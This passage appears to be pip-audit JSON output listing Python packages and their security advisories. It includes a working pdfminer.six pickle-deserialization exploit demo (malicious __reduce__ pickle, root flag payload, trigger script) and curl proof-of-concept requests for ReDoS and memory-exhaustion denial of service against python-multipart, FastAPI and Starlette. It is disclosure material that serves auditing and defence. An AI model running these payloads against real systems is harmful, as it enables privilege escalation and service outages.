movement.  ### Demo Scenario  **Environment:**   - Alpine Linux (Docker container) - Two users:     - `user1` (attacker: low-privilege)   - `root` (victim: runs privileged PDF-processing script) - Shared writable directory: `/tmp/uploads` - `CMAP_PATH` set to `/tmp/uploads` for the privileged script - pdfminer.six installed system-wide  **Attack Flow:**   1. `user1` creates a malicious CMap file (`Evil.pickle.gz`) in `/tmp/uploads`. 2. The privileged service (`root`) processes a PDF or calls `get_cmap(\"Evil\")`. 3. The malicious pickle is deserialized, running arbitrary code as root. 4. The exploit creates a flag file in `/root/pwnedByPdfminer` as proof.  ### Technical Details  - **Vulnerability Type:** Insecure deserialization of untrusted data using Python's `pickle` - **Attack Prerequisites:** Attacker can write to a directory included in `CMAP_PATH` - **Vulnerable Line:**     ```python   return type(str(name), (), pickle.loads(gzfile.read()))   ```   *In `pdfminer/cmapdb.py`'s `_load_data` method* - https://github.com/pdfminer/pdfminer.six/blob/20250506/pdfminer/cmapdb.py#L246 - **Proof of Concept:** See `createEvilPickle.py`, `evilmod.py`, and `processPdf.py`  **Exploit Chain:** - Attacker places a malicious `.pickle.gz` file in the CMap search path. - Privileged process (e.g., root) loads a CMap, triggering pickle deserialization. - Arbitrary code executes with the privilege of the process (root/service account).  ## Setup and Usage  ### \ud83d\udcc1 Files #### </> Dockerfile ```yml FROM python:3.11-alpine  # Install required packages and create users RUN adduser -D user1 && mkdir -p /tmp/uploads && chown user1:user1 /tmp/uploads  WORKDIR /app  # Install pdfminer.six RUN pip install --no-cache-dir pdfminer.six  # Copy app files COPY evilmod.py /app/evilmod.py COPY createEvilPickle.py /app/createEvilPickle.py COPY processPDF.py /app/processPDF.py  # Set up permissions for demo RUN chmod 777 /tmp/uploads  # Default: drop into a shell for demo instructions CMD [\"/bin/sh\"] ```  #### </> evilmod.py ```python import os  def evilFunc():     with open(\"/root/pwnedByPdfminer\", \"w\") as f:         f.write(\"ROOTED by pdfminer pickle RCE\\n\")     return {\"CODE2CID\": {}, \"IS_VERTICAL\": False} ``` #### </> createEvilPickle.py ```python import pickle import gzip from evilmod import evilFunc  class Evil:     def __reduce__(self):         return (evilFunc, ())  payload = pickle.dumps(Evil()) with gzip.open(\"/tmp/uploads/Evil.pickle.gz\", \"wb\") as f:     f.write(payload)  print(\"Malicious pickle created at /tmp/uploads/Evil.pickle.gz\") ``` #### </> processPDF.py ```python import os from pdfminer.cmapdb import CMapDB  os.environ[\"CMAP_PATH\"] = \"/tmp/uploads\"  CMapDB.get_cmap(\"Evil\")  print(\"CMap loaded. If vulnerable, /root/pwnedByPdfminer will be created.\") ```  ### Build and start the demo container  ```bash docker build -t pdfminer-priv-esc-demo . docker run --rm -it --name pdfminer-demo pdfminer-priv-esc-demo ```  ### In the container, open two shells in parallel (or switch users in one):  #### Shell 1 (Attacker: user1) ```bash su user1 cd /app python createEvilPickle.py # Confirms: /tmp/uploads/Evil.pickle.gz is created and owned by user1 ```  #### Shell 2 (Victim: root) ```bash cd /app python processPdf.py # Output: If vulnerable, /root/pwnedByPdfminer will be created ```  ### Proof of escalation  ```bash cat /root/pwnedByPdfminer # \ud83c\udff4 Output: ROOTED by pdfminer pickle RCE ```  ## Step-by-step Walkthrough  1. **user1** uses `createEvilPickle.py` to craft and place a malicious CMap pickle in a shared upload directory. 2. The **root** user runs a typical PDF-processing script, which loads CMap files from that directory. 3. The exploit triggers, running arbitrary code as root. 4. The attacker now has proof of code execution as root (and, in a real attack, could escalate further).  ## Security Standards & References  - **OWASP Top 10:**     - [A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)   - [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/) (by analogy, as it's code injection via deserialization)  - **MITRE ATT&CK Techniques:**     - [T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)   - [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)   ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)"}]}, {"name": "pdfplumber", "version": "0.11.5", "vulns": []}, {"name": "pexpect", "version": "4.9.0", "vulns": []}, {"name": "pillow", "version": "11.1.0", "vulns": []}, {"name": "pip", "version": "25.0.1", "vulns": [{"id": "GHSA-4xh5-x5gv-qwph", "fix_versions": ["25.3"], "aliases": ["CVE-2025-8869"], "description": "### Summary  In the fallback extraction path for source distributions, `pip` used Python\u2019s `tarfile` module without verifying that symbolic/hard link targets resolve inside the intended extraction directory. A malicious sdist can include links that escape the target directory and overwrite arbitrary files on the invoking host during `pip install`.  ### Impact  Successful exploitation enables arbitrary file overwrite outside the build/extraction directory on the machine running `pip`. This can be leveraged to tamper with configuration or startup files and may lead to further code execution depending on the environment, but the direct, guaranteed impact is integrity compromise on the vulnerable system.  ### Conditions  The issue is triggered when installing an attacker-controlled sdist (e.g., from an index or URL) and the fallback extraction code path is used. No special privileges are required beyond running `pip install`; active user action is necessary.  ### Remediation  The [fix](https://github.com/pypa/pip/pull/13550) is available starting in pip `25.3`. Using a Python interpreter that implements the safe-extraction behavior described by **PEP 706** provides additional defense in depth for other `tarfile` issues but is not a substitute for upgrading pip for this specific flaw."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.0", "vulns": []}, {"name": "portalocker", "version": "2.10.1", "vulns": []}, {"name": "posthog", "version": "3.18.0", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.50", "vulns": []}, {"name": "propcache", "version": "0.3.0", "vulns": []}, {"name": "proto-plus", "version": "1.26.0", "vulns": []}, {"name": "protobuf", "version": "5.29.3", "vulns": [{"id": "GHSA-8qvm-5x2c-j2w7", "fix_versions": ["4.25.8", "5.29.5", "6.31.1"], "aliases": ["CVE-2025-4565"], "description": "### Summary Any project that uses Protobuf pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of **recursive groups**, **recursive messages** or **a series of [`SGROUP`](https://protobuf.dev/programming-guides/encoding/#groups) tags** can be corrupted by exceeding the Python recursion limit.  Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team [ecosystem@trailofbits.com](mailto:ecosystem@trailofbits.com)  Affected versions: This issue only affects the [pure-Python implementation](https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends) of protobuf-python backend. This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.  This is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).  ### Severity This is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.  ### Proof of Concept For reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)  ### Remediation and Mitigation A mitigation is available now. Please update to the latest available versions of the following packages: * protobuf-python(4.25.8, 5.29.5, 6.31.1)"}]}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.3", "vulns": []}, {"name": "py", "version": "1.11.0", "vulns": [{"id": "PYSEC-2022-42969", "fix_versions": [], "aliases": ["GHSA-w596-4wvx-j9j6", "CVE-2022-42969"], "description": "The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled."}]}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyarrow", "version": "19.0.1", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pyasn1-modules", "version": "0.4.1", "vulns": []}, {"name": "pycairo", "version": "1.25.1", "vulns": []}, {"name": "pycodestyle", "version": "2.12.1", "vulns": []}, {"name": "pycparser", "version": "2.22", "vulns": []}, {"name": "pycups", "version": "2.0.1", "vulns": []}, {"name": "pydantic", "version": "2.4.2", "vulns": []}, {"name": "pydantic-ai", "version": "0.0.37", "vulns": []}, {"name": "pydantic-ai-slim", "version": "0.0.37", "vulns": []}, {"name": "pydantic-core", "version": "2.10.1", "vulns": []}, {"name": "pydantic-graph", "version": "0.0.37", "vulns": []}, {"name": "pydantic-settings", "version": "2.2.1", "vulns": []}, {"name": "pyflakes", "version": "3.2.0", "vulns": []}, {"name": "pygments", "version": "2.19.1", "vulns": []}, {"name": "pygobject", "version": "3.48.2", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pylance", "version": "0.23.2", "vulns": []}, {"name": "pymupdf", "version": "1.23.7", "vulns": []}, {"name": "pymupdfb", "version": "1.23.7", "vulns": []}, {"name": "pynacl", "version": "1.5.0", "vulns": []}, {"name": "pyparsing", "version": "3.1.1", "vulns": []}, {"name": "pypdf", "version": "5.3.1", "vulns": [{"id": "GHSA-7hfw-26vp-jp8m", "fix_versions": ["6.0.0"], "aliases": ["CVE-2025-55197"], "description": "### Impact An attacker who uses this vulnerability can craft a PDF which leads to the RAM being exhausted. This requires just reading the file if a series of FlateDecode filters is used on a malicious cross-reference stream. Other content streams are affected on explicit access.  ### Patches This has been fixed in [pypdf==6.0.0](https://github.com/py-pdf/pypdf/releases/tag/6.0.0).  ### Workarounds If you cannot upgrade yet, you might want to implement the workaround for `pypdf.filters.decompress` yourself: https://github.com/py-pdf/pypdf/blob/0dd57738bbdcdb63f0fb43d8a6b3d222b6946595/pypdf/filters.py#L72-L143  ### References This issue has been reported in #3429 and fixed in #3430."}, {"id": "GHSA-vr63-x8vc-m265", "fix_versions": ["6.1.3"], "aliases": ["CVE-2025-62707"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires parsing the content stream of a page which has an inline image using the DCTDecode filter.  ### Patches This has been fixed in [pypdf==6.1.3](https://github.com/py-pdf/pypdf/releases/tag/6.1.3).  ### Workarounds If you cannot upgrade yet, consider applying the changes from PR [#3501](https://github.com/py-pdf/pypdf/pull/3501)."}, {"id": "GHSA-jfx9-29x2-rv3j", "fix_versions": ["6.1.3"], "aliases": ["CVE-2025-62708"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing the content stream of a page using the LZWDecode filter.  ### Patches This has been fixed in [pypdf==6.1.3](https://github.com/py-pdf/pypdf/releases/tag/6.1.3).  ### Workarounds If you cannot upgrade yet, consider applying the changes from PR [#3502](https://github.com/py-pdf/pypdf/pull/3502)."}]}, {"name": "pypdfium2", "version": "4.30.1", "vulns": []}, {"name": "pypika", "version": "0.48.9", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pyqt5", "version": "5.15.10", "vulns": []}, {"name": "pyqt5-sip", "version": "12.13.0", "vulns": []}, {"name": "pyright", "version": "1.1.396", "vulns": []}, {"name": "pyrsistent", "version": "0.20.0", "vulns": []}, {"name": "pysbd", "version": "0.3.4", "vulns": []}, {"name": "pyserial", "version": "3.5", "vulns": []}, {"name": "python-apt", "skip_reason": "Dependency not found on PyPI and could not be audited: python-apt (2.7.7+ubuntu4)"}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-debian", "skip_reason": "Dependency not found on PyPI and could not be audited: python-debian (0.1.49+ubuntu2)"}, {"name": "python-dotenv", "version": "1.0.0", "vulns": []}, {"name": "python-jose", "version": "3.5.0", "vulns": []}, {"name": "python-multipart", "version": "0.0.6", "vulns": [{"id": "GHSA-2jv5-9r88-3w3p", "fix_versions": ["0.0.7"], "aliases": ["CVE-2024-24762"], "description": "### Summary  When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.  An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.  This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS  This only applies when the app uses form data, parsed with `python-multipart`.  ### Details  A regular HTTP `Content-Type` header could look like:  ``` Content-Type: text/html; charset=utf-8 ```  `python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74  A custom option could be made and sent to the server to break it with:  ``` Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ```  ### PoC  Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:  ```Python # main.py from wsgiref.simple_server import make_server from wsgiref.validate import validator  from multipart.multipart import parse_options_header   def simple_app(environ, start_response):     _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])      start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])     return [b\"Ok\"]   httpd = make_server(\"\", 8123, validator(simple_app)) print(\"Serving on port 8123...\") httpd.serve_forever() ```  Then send the attacking request with:  ```console $ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/' ```  ### Impact  This is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.  ### Original Report  This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r  <details> <summary>Original report to FastAPI</summary>  Hey Tiangolo!  My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>"}, {"id": "GHSA-59g5-xgcq-4qw3", "fix_versions": ["0.0.18"], "aliases": ["CVE-2024-53981"], "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.  An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"}]}, {"name": "pytube", "version": "15.0.0", "vulns": []}, {"name": "pytz", "version": "2024.2", "vulns": []}, {"name": "pyvis", "version": "0.3.2", "vulns": []}, {"name": "pyxdg", "version": "0.28", "vulns": []}, {"name": "pyyaml", "version": "6.0.2", "vulns": []}, {"name": "pyzmq", "version": "24.0.1", "vulns": []}, {"name": "qdrant-client", "version": "1.13.2", "vulns": []}, {"name": "referencing", "version": "0.36.2", "vulns": []}, {"name": "regex", "version": "2024.11.6", "vulns": []}, {"name": "reportlab", "version": "4.3.1", "vulns": []}, {"name": "requests", "version": "2.32.3", "vulns": [{"id": "GHSA-9hjg-9r4m-mvj7", "fix_versions": ["2.32.4"], "aliases": ["CVE-2024-47081"], "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"}]}, {"name": "requests-oauthlib", "version": "2.0.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rich", "version": "13.9.4", "vulns": []}, {"name": "rpds-py", "version": "0.23.1", "vulns": []}, {"name": "rsa", "version": "4.9", "vulns": []}, {"name": "s3transfer", "version": "0.11.4", "vulns": []}, {"name": "safetensors", "version": "0.5.3", "vulns": []}, {"name": "schema", "version": "0.7.7", "vulns": []}, {"name": "screen-resolution-extra", "skip_reason": "Dependency not found on PyPI and could not be audited: screen-resolution-extra (0.0.0)"}, {"name": "setuptools", "version": "75.8.2", "vulns": [{"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["CVE-2025-47273", "GHSA-5rjg-fvgr-3xxf"], "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."}]}, {"name": "shapely", "version": "2.0.7", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.6", "vulns": []}, {"name": "speedtest-cli", "version": "2.1.3", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.38", "vulns": []}, {"name": "stack-data", "version": "0.6.3", "vulns": []}, {"name": "starlette", "version": "0.27.0", "vulns": [{"id": "GHSA-f96h-pmfr-66vw", "fix_versions": ["0.40.0"], "aliases": ["CVE-2024-47874"], "description": "### Summary Starlette treats `multipart/form-data` parts without a `filename` as text form fields and buffers those in byte strings with no size limit. This allows an attacker to upload arbitrary large form fields and cause Starlette to both slow down significantly due to excessive memory allocations and copy operations, and also consume more and more memory until the server starts swapping and grinds to a halt, or the OS terminates the server process with an OOM error. Uploading multiple such requests in parallel may be enough to render a service practically unusable, even if reasonable request size limits are enforced by a reverse proxy in front of Starlette.  ### PoC  ```python from starlette.applications import Starlette from starlette.routing import Route  async def poc(request):     async with request.form():         pass  app = Starlette(routes=[     Route('/', poc, methods=[\"POST\"]), ]) ```  ```sh curl http://localhost:8000 -F 'big=</dev/urandom' ```  ### Impact This Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) accepting form requests. "}, {"id": "GHSA-2c2j-9gv5-cj73", "fix_versions": ["0.47.2"], "aliases": ["CVE-2025-54121"], "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."}]}, {"name": "sympy", "version": "1.13.3", "vulns": []}, {"name": "systemd-python", "version": "235", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tenacity", "version": "9.0.0", "vulns": []}, {"name": "texttable", "version": "1.6.7", "vulns": []}, {"name": "tiktoken", "version": "0.7.0", "vulns": []}, {"name": "timeout", "version": "0.1.2", "vulns": []}, {"name": "tokenizers", "version": "0.21.1", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.2.1", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "transformers", "version": "4.50.2", "vulns": [{"id": "GHSA-489j-g2vx-39wf", "fix_versions": ["4.51.0"], "aliases": ["CVE-2025-3262"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the huggingface/transformers repository, specifically in version 4.49.0. The vulnerability is due to inefficient regular expression complexity in the `SETTING_RE` variable within the `transformers/commands/chat.py` file. The regex contains repetition groups and non-optimized quantifiers, leading to exponential backtracking when processing 'almost matching' payloads. This can degrade application performance and potentially result in a denial-of-service (DoS) when handling specially crafted input strings. The issue is fixed in version 4.51.0."}, {"id": "GHSA-q2wp-rjmx-x6x9", "fix_versions": ["4.51.0"], "aliases": ["CVE-2025-3263"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically in the `get_configuration_file()` function within the `transformers.configuration_utils` module. The affected version is 4.49.0, and the issue is resolved in version 4.51.0. The vulnerability arises from the use of a regular expression pattern `config\\.(.*)\\.json` that can be exploited to cause excessive CPU consumption through crafted input strings, leading to catastrophic backtracking. This can result in model serving disruption, resource exhaustion, and increased latency in applications using the library."}, {"id": "GHSA-jjph-296x-mrcr", "fix_versions": ["4.51.0"], "aliases": ["CVE-2025-3264"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically in the `get_imports()` function within `dynamic_module_utils.py`. This vulnerability affects versions 4.49.0 and is fixed in version 4.51.0. The issue arises from a regular expression pattern `\\s*try\\s*:.*?except.*?:` used to filter out try/except blocks from Python code, which can be exploited to cause excessive CPU consumption through crafted input strings due to catastrophic backtracking. This vulnerability can lead to remote code loading disruption, resource exhaustion in model serving, supply chain attack vectors, and development pipeline disruption."}, {"id": "GHSA-phhr-52qp-3mj4", "fix_versions": ["4.52.1"], "aliases": ["CVE-2025-3777"], "description": "Hugging Face Transformers versions up to 4.49.0 are affected by an improper input validation vulnerability in the `image_utils.py` file. The vulnerability arises from insecure URL validation using the `startswith()` method, which can be bypassed through URL username injection. This allows attackers to craft URLs that appear to be from YouTube but resolve to malicious domains, potentially leading to phishing attacks, malware distribution, or data exfiltration. The issue is fixed in version 4.52.1."}, {"id": "GHSA-37mw-44qp-f5jm", "fix_versions": ["4.52.1"], "aliases": ["CVE-2025-3933"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically within the DonutProcessor class's `token2json()` method. This vulnerability affects versions 4.51.3 and earlier, and is fixed in version 4.52.1. The issue arises from the regex pattern `<s_(.*?)>` which can be exploited to cause excessive CPU consumption through crafted input strings due to catastrophic backtracking. This vulnerability can lead to service disruption, resource exhaustion, and potential API service vulnerabilities, impacting document processing tasks using the Donut model."}, {"id": "GHSA-9356-575x-2w9m", "fix_versions": ["4.53.0"], "aliases": ["CVE-2025-5197"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability exists in the Hugging Face Transformers library, specifically in the `convert_tf_weight_name_to_pt_weight_name()` function. This function, responsible for converting TensorFlow weight names to PyTorch format, uses a regex pattern `/[^/]*___([^/]*)/` that can be exploited to cause excessive CPU consumption through crafted input strings due to catastrophic backtracking. The vulnerability affects versions up to 4.51.3 and is fixed in version 4.53.0. This issue can lead to service disruption, resource exhaustion, and potential API service vulnerabilities, impacting model conversion processes between TensorFlow and PyTorch formats."}, {"id": "GHSA-59p9-h35m-wg4g", "fix_versions": ["4.53.0"], "aliases": ["CVE-2025-6638"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically affecting the MarianTokenizer's `remove_language_code()` method. This vulnerability is present in version 4.52.4 and has been fixed in version 4.53.0. The issue arises from inefficient regex processing, which can be exploited by crafted input strings containing malformed language code patterns, leading to excessive CPU consumption and potential denial of service."}, {"id": "GHSA-rcv9-qm8p-9p6j", "fix_versions": ["4.53.0"], "aliases": ["CVE-2025-6051"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically within the `normalize_numbers()` method of the `EnglishNormalizer` class. This vulnerability affects versions up to 4.52.4 and is fixed in version 4.53.0. The issue arises from the method's handling of numeric strings, which can be exploited using crafted input strings containing long sequences of digits, leading to excessive CPU consumption. This vulnerability impacts text-to-speech and number normalization tasks, potentially causing service disruption, resource exhaustion, and API vulnerabilities."}, {"id": "GHSA-4w7r-h757-3r74", "fix_versions": ["4.53.0"], "aliases": ["CVE-2025-6921"], "description": "The huggingface/transformers library, versions prior to 4.53.0, is vulnerable to Regular Expression Denial of Service (ReDoS) in the AdamWeightDecay optimizer. The vulnerability arises from the _do_use_weight_decay method, which processes user-controlled regular expressions in the include_in_weight_decay and exclude_from_weight_decay lists. Malicious regular expressions can cause catastrophic backtracking during the re.search call, leading to 100% CPU utilization and a denial of service. This issue can be exploited by attackers who can control the patterns in these lists, potentially causing the machine learning task to hang and rendering services unresponsive."}]}, {"name": "typer", "version": "0.15.2", "vulns": []}, {"name": "types-requests", "version": "2.32.0.20250301", "vulns": []}, {"name": "typing-extensions", "version": "4.12.2", "vulns": []}, {"name": "typing-inspect", "version": "0.9.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.0", "vulns": []}, {"name": "tzdata", "version": "2025.1", "vulns": []}, {"name": "ubuntu-drivers-common", "skip_reason": "Dependency not found on PyPI and could not be audited: ubuntu-drivers-common 